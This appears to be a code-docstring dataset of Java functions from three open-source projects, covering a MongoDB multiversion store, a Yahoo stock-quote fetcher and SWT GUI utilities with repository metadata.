{"docstring": "/**\n * Filter out even numbers\n */\n", "func_signal": "@Test\npublic void even()", "code": "{\n\tList<Integer> ints = new ArrayList<Integer>();\n\tfor (int i = 0; i < 20; ++i) {\n\t\tints.add(i);\n\t}\n\tIterator<Integer> ti = new FilteringIterator<Integer>(ints.iterator(),\n\t\t\tnew Filter<Integer>() {\n\t\t@Override\n\t\tpublic boolean filter(Integer t) {\n\t\t\treturn t % 2 != 0;\n\t\t}\n\t});\n\tfor (int i = 0; i < 10; ++i) {\n\t\tassertTrue(ti.hasNext());\n\t\tassertEquals(i * 2 + 1, (int)ti.next());\n\t}\n\tassertFalse(ti.hasNext());\n}", "path": "src\\test\\java\\de\\fhg\\igd\\mongomvcc\\helper\\FilteringIteratorTest.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Tests what happens if we filter out all elements\n */\n", "func_signal": "@Test\npublic void empty()", "code": "{\n\tList<Integer> ints = new ArrayList<Integer>();\n\tfor (int i = 0; i < 20; ++i) {\n\t\tints.add(i);\n\t}\n\tIterator<Integer> ti = new FilteringIterator<Integer>(ints.iterator(),\n\t\t\tnew Filter<Integer>() {\n\t\t@Override\n\t\tpublic boolean filter(Integer t) {\n\t\t\treturn false;\n\t\t}\n\t});\n\tassertFalse(ti.hasNext());\n}", "path": "src\\test\\java\\de\\fhg\\igd\\mongomvcc\\helper\\FilteringIteratorTest.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Filter out odd numbers\n */\n", "func_signal": "@Test\npublic void odd()", "code": "{\n\tList<Integer> ints = new ArrayList<Integer>();\n\tfor (int i = 0; i < 20; ++i) {\n\t\tints.add(i);\n\t}\n\tIterator<Integer> ti = new FilteringIterator<Integer>(ints.iterator(),\n\t\t\tnew Filter<Integer>() {\n\t\t@Override\n\t\tpublic boolean filter(Integer t) {\n\t\t\treturn t % 2 == 0;\n\t\t}\n\t});\n\tfor (int i = 0; i < 10; ++i) {\n\t\tassertTrue(ti.hasNext());\n\t\tassertEquals(i * 2, (int)ti.next());\n\t}\n\tassertFalse(ti.hasNext());\n}", "path": "src\\test\\java\\de\\fhg\\igd\\mongomvcc\\helper\\FilteringIteratorTest.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Set up an array of random values\n */\n", "func_signal": "@BeforeClass\npublic static void setUpClass()", "code": "{\n\tfor (int i = 0; i < values.length; ++i) {\n\t\tvalues[i] = (long)(Math.random() * values.length);\n\t}\n}", "path": "src\\test\\java\\de\\fhg\\igd\\mongomvcc\\helper\\IdHashMapBenchmark.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Rebuilds the whole table to eliminate all cells marked as DELETED\n */\n", "func_signal": "private void compact()", "code": "{\n\tlong[] oldTable = _table;\n\tmakeTable(_capacity);\n\tcopyValues(oldTable);\n}", "path": "src\\main\\java\\de\\fhg\\igd\\mongomvcc\\helper\\IdHashSet.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Adds a commit to the tree\n * @param commit the commit to add\n */\n", "func_signal": "public void addCommit(Commit commit)", "code": "{\n\tDBObject o = new BasicDBObject();\n\to.put(MongoDBConstants.ID, commit.getCID());\n\to.put(MongoDBConstants.TIMESTAMP, commit.getTimestamp());\n\to.put(PARENT_CID, commit.getParentCID());\n\to.put(ROOT_CID, commit.getRootCID());\n\tDBObject objs = new BasicDBObject();\n\tfor (Map.Entry<String, IdMap> e : commit.getObjects().entrySet()) {\n\t\tDBObject co = new BasicDBObject();\n\t\tIdMapIterator it = e.getValue().iterator();\n\t\twhile (it.hasNext()) {\n\t\t\tit.advance();\n\t\t\tco.put(String.valueOf(it.key()), it.value());\n\t\t}\n\t\tobjs.put(e.getKey(), co);\n\t}\n\to.put(OBJECTS, objs);\n\t_commits.insert(o);\n}", "path": "src\\main\\java\\de\\fhg\\igd\\mongomvcc\\impl\\internal\\Tree.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Resolves a CID to its corresponding commit\n * @param cid the CID\n * @return the commit\n * @throws VException if the commit is unknown\n */\n", "func_signal": "public Commit resolveCommit(long cid)", "code": "{\n\tDBObject o = _commits.findOne(cid);\n\tif (o == null) {\n\t\tthrow new VException(\"Unknown commit: \" + cid);\n\t}\n\treturn deserializeCommit(o);\n}", "path": "src\\main\\java\\de\\fhg\\igd\\mongomvcc\\impl\\internal\\Tree.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Adds a value to the table (without checks)\n * @param value the value\n * @return true if the value has been added, false if it was already\n * in the table\n */\n", "func_signal": "private boolean addInternal(long value)", "code": "{\n\tint h0 = hash(value);\n\tint h = h0 % _capacity;\n\tif (_table[h] == value) {\n\t\treturn false;\n\t}\n\tif (_table[h] != FREE && _table[h] != DELETED) {\n\t\tint h1 = 1 + (h0 % (_capacity - 2));\n\t\tdo {\n\t\t\th -= h1;\n\t\t\tif (h < 0) {\n\t\t\t\th += _capacity;\n\t\t\t}\n\t\t\tif (_table[h] == value) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t} while (_table[h] != FREE && _table[h] != DELETED);\n\t}\n\tif (_table[h] == DELETED) {\n\t\t--_deleted;\n\t}\n\t_table[h] = value;\n\treturn true;\n}", "path": "src\\main\\java\\de\\fhg\\igd\\mongomvcc\\helper\\IdHashSet.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Loads a branch from the database or fails if it does not exist\n * @param name the branch's name\n * @return the document representing the branch\n * @throws VException if the branch does not exist\n */\n", "func_signal": "private DBObject findBranch(String name)", "code": "{\n\tDBObject branch = _branches.findOne(name);\n\tif (branch == null) {\n\t\tthrow new VException(\"Unknown branch: \" + name);\n\t}\n\treturn branch;\n}", "path": "src\\main\\java\\de\\fhg\\igd\\mongomvcc\\impl\\internal\\Tree.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Resolves the head commit of a named branch\n * @param name the name of the branch to resolve\n * @return the resolved commit\n * @throws VException if the commit could not be resolved\n */\n", "func_signal": "public Commit resolveBranch(String name)", "code": "{\n\tDBObject branch = findBranch(name);\n\treturn resolveCommit((Long)branch.get(MongoDBConstants.CID));\n}", "path": "src\\main\\java\\de\\fhg\\igd\\mongomvcc\\impl\\internal\\Tree.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Updates the head of a branch. Always waits for the database to\n * fsync before returning. This guarantees all threads will see the change.\n * This operation will usually be the last one when a commit is made, so\n * fsync'ing here is crucial for the database's integrity. Fsync'ing will\n * also make the database write all other documents created during the\n * commit to the hard disk.\n * @param name the branch's name\n * @param headCID the CID of the new head\n */\n", "func_signal": "public void updateBranchHead(String name, long headCID)", "code": "{\n\t_branches.update(new BasicDBObject(MongoDBConstants.ID, name),\n\t\t\tnew BasicDBObject(\"$set\", new BasicDBObject(MongoDBConstants.CID, headCID)),\n\t\t\tfalse, false, WriteConcern.FSYNC_SAFE);\n}", "path": "src\\main\\java\\de\\fhg\\igd\\mongomvcc\\impl\\internal\\Tree.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Creates a new tree object\n * @param db the MongoDB database\n */\n", "func_signal": "public Tree(DB db)", "code": "{\n\t_branches = db.getCollection(MongoDBConstants.COLLECTION_BRANCHES);\n\t_commits = db.getCollection(MongoDBConstants.COLLECTION_COMMITS);\n}", "path": "src\\main\\java\\de\\fhg\\igd\\mongomvcc\\impl\\internal\\Tree.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Constructs a new cursor\n * @param delegate the actual MongoDB cursor\n * @param filter a filter which decides if a DBObject should be included\n * into the cursor's result or not (can be null)\n */\n", "func_signal": "public MongoDBVCursor(DBCursor delegate, Filter<DBObject> filter)", "code": "{\n\t_delegate = delegate;\n\t_filter = filter;\n}", "path": "src\\main\\java\\de\\fhg\\igd\\mongomvcc\\impl\\MongoDBVCursor.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Test our implementation\n */\n", "func_signal": "@Test\npublic void idMap()", "code": "{\n\tIdMap map = new IdHashMap(values.length);\n\tfor (int i = 0; i < values.length; ++i) {\n\t\tmap.put(values[i], values[values.length - i - 1]);\n\t}\n\t\n\tfor (int i = 0; i < values.length; ++i) {\n\t\tassertTrue(map.containsKey(values[i]));\n\t}\n\t\n\tfor (int i = 0; i < values.length; ++i) {\n\t\tmap.remove(values[i]);\n\t}\n}", "path": "src\\test\\java\\de\\fhg\\igd\\mongomvcc\\helper\\IdHashMapBenchmark.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Resolves the CID of a named branch's root\n * @param name the branch's name\n * @return the resolved CID\n * @throws VException if the branch does not exist\n */\n", "func_signal": "public long resolveBranchRootCid(String name)", "code": "{\n\tDBObject branch = findBranch(name);\n\treturn (Long)branch.get(ROOT_CID);\n}", "path": "src\\main\\java\\de\\fhg\\igd\\mongomvcc\\impl\\internal\\Tree.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Checks if a given commit has got children\n * @param cid the commit's CID\n * @return true if the commit has children, false otherwise\n */\n", "func_signal": "public boolean hasChildren(long cid)", "code": "{\n\tif (cid != 0 && !existsCommit(cid)) {\n\t\tthrow new VException(\"Unknown commit: \" + cid);\n\t}\n\treturn (_commits.count(new BasicDBObject(PARENT_CID, cid)) > 0);\n}", "path": "src\\main\\java\\de\\fhg\\igd\\mongomvcc\\impl\\internal\\Tree.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Test the java implementation\n */\n", "func_signal": "@Test\npublic void javaLongMap()", "code": "{\n\tMap<Long, Long> map = new HashMap<Long, Long>(values.length * 3 / 2);\n\tfor (int i = 0; i < values.length; ++i) {\n\t\tmap.put(values[i], values[values.length - i - 1]);\n\t}\n\t\n\tfor (int i = 0; i < values.length; ++i) {\n\t\tassertTrue(map.containsKey(values[i]));\n\t}\n\t\n\tfor (int i = 0; i < values.length; ++i) {\n\t\tmap.remove(values[i]);\n\t}\n}", "path": "src\\test\\java\\de\\fhg\\igd\\mongomvcc\\helper\\IdHashMapBenchmark.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Constructs a new set with the given number of\n * expected elements and load factor\n * @param expectedSize the number of expected elements\n * @param loadFactor the load factor\n */\n", "func_signal": "public IdHashSet(int expectedSize, float loadFactor)", "code": "{\n\t_overloadFactor = 1 + (1 - loadFactor);\n\tensureCapacity(expectedSize);\n}", "path": "src\\main\\java\\de\\fhg\\igd\\mongomvcc\\helper\\IdHashSet.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Deserializes a database object to a commit\n * @param o the object\n * @return the commit\n */\n", "func_signal": "public static Commit deserializeCommit(DBObject o)", "code": "{\n\tlong cid = (Long)o.get(MongoDBConstants.ID);\n\tLong timestampL = (Long)o.get(MongoDBConstants.TIMESTAMP);\n\tlong timestamp = timestampL != null ? timestampL : 0;\n\tlong parentCID = (Long)o.get(PARENT_CID);\n\tlong rootCID = (Long)o.get(ROOT_CID);\n\tDBObject objs = (DBObject)o.get(OBJECTS);\n\tMap<String, IdMap> objects = new HashMap<String, IdMap>();\n\tfor (String k : objs.keySet()) {\n\t\tif (!k.equals(MongoDBConstants.ID)) {\n\t\t\tobjects.put(k, resolveCollectionObjects((DBObject)objs.get(k)));\n\t\t}\n\t}\n\treturn new Commit(cid, timestamp, parentCID, rootCID, objects);\n}", "path": "src\\main\\java\\de\\fhg\\igd\\mongomvcc\\impl\\internal\\Tree.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
{"docstring": "/**\n * Returns the stock's change from the 50 day moving average\n * \n * @param symbol the stock to use\n * @return the change amount\n */\n", "func_signal": "public String getChangeFrom50DayMovingAverage(String symbol)", "code": "{\n\tURL url = null;\n\n\ttry {\n\t\turl = new URL(baseURL + symbol + tagURL + \"m7\");\n\t} catch (MalformedURLException e) {\n\t\te.printStackTrace();\n\t}\n\n\t// Retrieves the stock data from the constructed URL\n\treturn processURL(url);\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Returns the stock's Earnings per share estimate for next quarter\n * \n * @param symbol the stock to use\n * @return the estimate\n */\n", "func_signal": "public String getEPSEstimateNextQuarter(String symbol)", "code": "{\n\tURL url = null;\n\n\ttry {\n\t\turl = new URL(baseURL + symbol + tagURL + \"e9\");\n\t} catch (MalformedURLException e) {\n\t\te.printStackTrace();\n\t}\n\n\t// Retrieves the stock data from the constructed URL\n\treturn processURL(url);\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Returns the current ask price of the stock\n * \n * @param symbol the stock to use\n * @return the ask price\n */\n", "func_signal": "public String getAskPrice(String symbol)", "code": "{\n\tURL url = null;\n\n\ttry {\n\t\turl = new URL(baseURL + symbol + tagURL + \"a\");\n\t} catch (MalformedURLException e) {\n\t\te.printStackTrace();\n\t}\n\n\t// Retrieves the stock data from the constructed URL\n\treturn processURL(url);\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Returns the stock's market cap\n * \n * @param symbol the stock to use\n * @return the market cap amount\n */\n", "func_signal": "public String getMarketCapilization(String symbol)", "code": "{\n\tURL url = null;\n\n\ttry {\n\t\turl = new URL(baseURL + symbol + tagURL + \"j1\");\n\t} catch (MalformedURLException e) {\n\t\te.printStackTrace();\n\t}\n\n\t// Retrieves the stock data from the constructed URL\n\treturn processURL(url);\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Returns the current bid price of the stock\n * \n * @param symbol the stock to use\n * @return the bid price\n */\n", "func_signal": "public String getBid(String symbol)", "code": "{\n\tURL url = null;\n\n\ttry {\n\t\turl = new URL(baseURL + symbol + tagURL + \"b\");\n\t} catch (MalformedURLException e) {\n\t\te.printStackTrace();\n\t}\n\n\treturn processURL(url);\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Returns the stock's current volume\n * \n * @param symbol the stock to use\n * @return the volume\n */\n", "func_signal": "public String getVolume(String symbol)", "code": "{\n\tURL url = null;\n\n\ttry {\n\t\turl = new URL(baseURL + symbol + tagURL + \"v\");\n\t} catch (MalformedURLException e) {\n\t\te.printStackTrace();\n\t}\n\n\t// Retrieves the stock data from the constructed URL\n\treturn processURL(url);\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Returns the book value of the stock\n * \n * @param symbol the stock to use\n * @return the book value\n */\n", "func_signal": "public String getBookValue(String symbol)", "code": "{\n\tURL url = null;\n\n\ttry {\n\t\turl = new URL(baseURL + symbol + tagURL + \"b4\");\n\t} catch (MalformedURLException e) {\n\t\te.printStackTrace();\n\t}\n\n\t// Retrieves the stock data from the constructed URL\n\treturn processURL(url);\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Calculates the high, low, and the threshold values\n * that will be used by in Fibonacci computation\n * \n * Uses the Stock's 52 week high and low and its 50 day moving average\n * in computing the values.\n * \n * @param symbol the Stock\n * @return the High, Low, and Threshold amounts\n */\n", "func_signal": "public static String[] calculateHighAndLow_HLAVG(String symbol)", "code": "{\n\tString low, high = null;\n\tString[] values = new String[3];\n\tdouble curPrice = Double.parseDouble(GeneralToolKit.fetcher.getLastTradePriceOnly(symbol));\n\tdouble fiftyday = Double.parseDouble(GeneralToolKit.fetcher.get50DayMovingAverage(symbol));\n\n\t// If the current price is high than the 50 day\n\t// Use the 52 week high as the high and the 50 day as the low\n\t// Otherwise, use the 50 day as the high and the 52 week low as the low\n\tif (curPrice > fiftyday) {\n\t\tlow = Double.toString(fiftyday);\n\t\thigh = GeneralToolKit.fetcher.get52WeekHigh(symbol);\n\t} else {\n\t\tlow = GeneralToolKit.fetcher.get52WeekLow(symbol);\n\t\thigh = Double.toString(fiftyday);\n\t}\n\n\tdouble lowAmount = Double.parseDouble(low);\n\tdouble highAmount = Double.parseDouble(high);\n\t\n\t// Computes a relative threshold to allow for stocks\n\t// approaching the Fib Levels to trigger trades\n\tdouble threshold = ((highAmount - lowAmount) / 50);\n\t\n\tvalues[0] = low;\n\tvalues[1] = high;\n\tvalues[2] = Double.toString(threshold);\n\n\treturn values;\n}", "path": "Algorithmic Stock Trader\\src\\utilities\\AlgorithmToolKit.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Returns the stock's ticker trend\n * \n * @param symbol the stock to use\n * @return the trend\n */\n", "func_signal": "public String getTickerTrend(String symbol)", "code": "{\n\tURL url = null;\n\n\ttry {\n\t\turl = new URL(baseURL + symbol + tagURL + \"t7\");\n\t} catch (MalformedURLException e) {\n\t\te.printStackTrace();\n\t}\n\n\t// Retrieves the stock data from the constructed URL\n\treturn processURL(url);\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Returns the high limit of the stock\n * \n * @param symbol the stock to use\n * @return the high limit\n */\n", "func_signal": "public String getHighLimit(String symbol)", "code": "{\n\tURL url = null;\n\n\ttry {\n\t\turl = new URL(baseURL + symbol + tagURL + \"12\");\n\t} catch (MalformedURLException e) {\n\t\te.printStackTrace();\n\t}\n\n\t// Retrieves the stock data from the constructed URL\n\treturn processURL(url);\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Returns the stock's ask price in real time\n * \n * @param symbol the stock to use\n * @return the real time ask price\n */\n", "func_signal": "public String getAskRealTime(String symbol)", "code": "{\n\tURL url = null;\n\n\ttry {\n\t\turl = new URL(baseURL + symbol + tagURL + \"b2\");\n\t} catch (MalformedURLException e) {\n\t\te.printStackTrace();\n\t}\n\n\t// Retrieves the stock data from the constructed URL\n\treturn processURL(url);\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Returns a list of stock data for for a list of symbols\n * \n * @param symbols\n * @param tags\n * @return\n */\n", "func_signal": "public String getMultipleSymbolData(String[] symbols, String[] tags)", "code": "{\n\tURL url = null;\n\tString urlString;\n\tString stockData;\n\n\t// Constructs URL\n\turlString = baseURL;\n\n\tfor (String symbol : symbols) {\n\t\turlString = urlString + symbol + \"+\";\n\t}\n\n\t// Strips last + from URL and appends the tag URL\n\turlString = urlString.substring(0, urlString.length() - 1);\n\turlString = urlString + tagURL;\n\n\t// Adds each tag to the URL\n\tfor (String tag : tags) {\n\t\turlString = urlString + tag;\n\t}\n\n\ttry {\n\t\turl = new URL(urlString);\n\t} catch (MalformedURLException e) {\n\t\te.printStackTrace();\n\t}\n\n\t// Retrieves Data\n\tstockData = processURL(url);\n\n\treturn stockData;\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Returns the company name of the stock\n * \n * @param symbol the stock to use\n * @return the name\n */\n", "func_signal": "public String getName(String symbol)", "code": "{\n\tURL url = null;\n\n\ttry {\n\t\turl = new URL(baseURL + symbol + tagURL + \"n\");\n\t} catch (MalformedURLException e) {\n\t\te.printStackTrace();\n\t}\n\n\t// Retrieves the stock data from the constructed URL\n\treturn processURL(url);\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Returns the percent change from the stock's 52 week high\n * \n * @param symbol the stock to use\n * @return the percent change\n */\n", "func_signal": "public String getChangePercentFrom52WeekHigh(String symbol)", "code": "{\n\tURL url = null;\n\n\ttry {\n\t\turl = new URL(baseURL + symbol + tagURL + \"k5\");\n\t} catch (MalformedURLException e) {\n\t\te.printStackTrace();\n\t}\n\n\t// Retrieves the stock data from the constructed URL\n\treturn processURL(url);\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Returns the stock's holdings gain\n * \n * @param symbol the stock to use\n * @return the holdings gain\n */\n", "func_signal": "public String getHoldingsGain(String symbol)", "code": "{\n\tURL url = null;\n\n\ttry {\n\t\turl = new URL(baseURL + symbol + tagURL + \"g4\");\n\t} catch (MalformedURLException e) {\n\t\te.printStackTrace();\n\t}\n\n\t// Retrieves the stock data from the constructed URL\n\treturn processURL(url);\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Prints the available tags to retrieve stock data\n * \n */\n", "func_signal": "public void printTags()", "code": "{\n\tfor (Entry<String, String> curTag : tags.entrySet()) {\n\t\tSystem.out.println(curTag.getKey() + \": \" +  curTag.getValue());\n\t}\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Returns the stock'spercent change from it's 200 day moving average\n * \n * @param symbol the stock to use\n * @return the percent change\n */\n", "func_signal": "public String getPercentChangeFrom200DayMovingAverage(String symbol)", "code": "{\n\tURL url = null;\n\n\ttry {\n\t\turl = new URL(baseURL + symbol + tagURL + \"m6\");\n\t} catch (MalformedURLException e) {\n\t\te.printStackTrace();\n\t}\n\n\t// Retrieves the stock data from the constructed URL\n\treturn processURL(url);\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Returns the percent change of the stock\n * \n * @param symbol the stock to use\n * @return the percent change\n */\n", "func_signal": "public String getChangePercent(String symbol)", "code": "{\n\tURL url = null;\n\n\ttry {\n\t\turl = new URL(baseURL + symbol + tagURL + \"k2\");\n\t} catch (MalformedURLException e) {\n\t\te.printStackTrace();\n\t}\n\n\t// Retrieves the stock data from the constructed URL\n\treturn processURL(url);\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Returns the stock's short ratio\n * \n * @param symbol the stock to use\n * @return the ratio\n */\n", "func_signal": "public String getShortRatio(String symbol)", "code": "{\n\tURL url = null;\n\n\ttry {\n\t\turl = new URL(baseURL + symbol + tagURL + \"s7\");\n\t} catch (MalformedURLException e) {\n\t\te.printStackTrace();\n\t}\n\n\t// Retrieves the stock data from the constructed URL\n\treturn processURL(url);\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "/**\n * Returns the stock's change from it's 52 week high\n * \n * @param symbol the stock to use\n * @return the change amount\n */\n", "func_signal": "public String getChangeFrom52WeekHigh(String symbol)", "code": "{\n\tURL url = null;\n\n\ttry {\n\t\turl = new URL(baseURL + symbol + tagURL + \"k4\");\n\t} catch (MalformedURLException e) {\n\t\te.printStackTrace();\n\t}\n\n\t// Retrieves the stock data from the constructed URL\n\treturn processURL(url);\n}", "path": "Algorithmic Stock Trader\\src\\incoming_data_sources\\YahooFetcher.java", "repo_name": "sps5688/Algorithmic_Stock_Trader", "stars": 76, "license": "mit", "language": "java", "size": 227}
{"docstring": "// --------------------------------------------------------------------------------\n", "func_signal": "public static void getTreeColumnWidthFromProperties( String prefix, Tree tree, MProperties prop, int[] defaultWidth )", "code": "{\nTreeColumn[] columns = tree.getColumns();\nif( columns.length > defaultWidth.length )\n\t{\n\tgetTreeColumnWidthFromProperties(  prefix, tree, prop, 20 );\n\t}\nelse\n\t{\n\tfor( int i = 0; i < columns.length; ++i )\n\t\t{\n\t\tcolumns[ i ].setWidth( prop.getIntProperty( prefix + \".treeColumnWidth\" + Integer.toString( i ), defaultWidth[ i ] ) );\n\t\t}\n\t}\n}", "path": "src\\net\\jumperz\\gui\\MSwtUtil.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "// --------------------------------------------------------------------------------\n", "func_signal": "public static void addListenerToTableColumns2( Table table, Listener listener )", "code": "{\nTableColumn[] columns = table.getColumns();\nfor( int i = 0; i < columns.length; ++i )\n\t{\n\tcolumns[ i ].addListener( SWT.Resize, listener );\n\tcolumns[ i ].addListener( SWT.Selection, listener );\n\t}\n}", "path": "src\\net\\jumperz\\gui\\MSwtUtil.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "//--------------------------------------------------------------------------------\n", "func_signal": "public static void getTableColumnWidthFromProperties( String prefix, Table table, MProperties prop, int defaultWidth )", "code": "{\ntry\n\t{\n\tTableColumn[] columns = table.getColumns();\n\tfor( int i = 0; i < columns.length; ++i )\n\t\t{\n\t\tcolumns[ i ].setWidth( prop.getIntProperty( prefix + \".columnWidth\" + Integer.toString( i ), defaultWidth ) );\n\t\t}\n\t}\ncatch( Exception e )\n\t{\n\te.printStackTrace();\n\t}\n}", "path": "src\\net\\jumperz\\gui\\MSwtUtil.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "//--------------------------------------------------------------------------------\n", "func_signal": "public void init( String _authToken )\nthrows IOException", "code": "{\nif( _authToken == null )\n\t{\n\tinit();\n\t}\nelse\n\t{\n\tauthToken = _authToken;\n\t}\n}", "path": "src\\net\\jumperz\\net\\dozens\\MSession.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "// --------------------------------------------------------------------------------\n", "func_signal": "public static void setTableColumnWidthToProperties( String prefix, Table table, MProperties prop )", "code": "{\nTableColumn[] columns = table.getColumns();\nfor( int i = 0; i < columns.length -1; ++i )\n\t{\n\tprop.setProperty( prefix + \".columnWidth\" + Integer.toString( i ), columns[ i ].getWidth() );\n\t}\n}", "path": "src\\net\\jumperz\\gui\\MSwtUtil.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "//--------------------------------------------------------------------------------\n", "func_signal": "public void init()\nthrows IOException", "code": "{\nMap header = new HashMap();\nheader.put( \"X-Auth-User\", user );\nheader.put( \"X-Auth-Key\", apiKey );\n\nMap result = callApi( \"/api/authorize.json\", header );\nif( !result.containsKey( \"auth_token\" ) )\n\t{\n\tthrow new IOException( \"Auth failed: auth_token not found. \" + result );\n\t}\nauthToken = ( String )result.get( \"auth_token\" );\n}", "path": "src\\net\\jumperz\\net\\dozens\\MSession.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
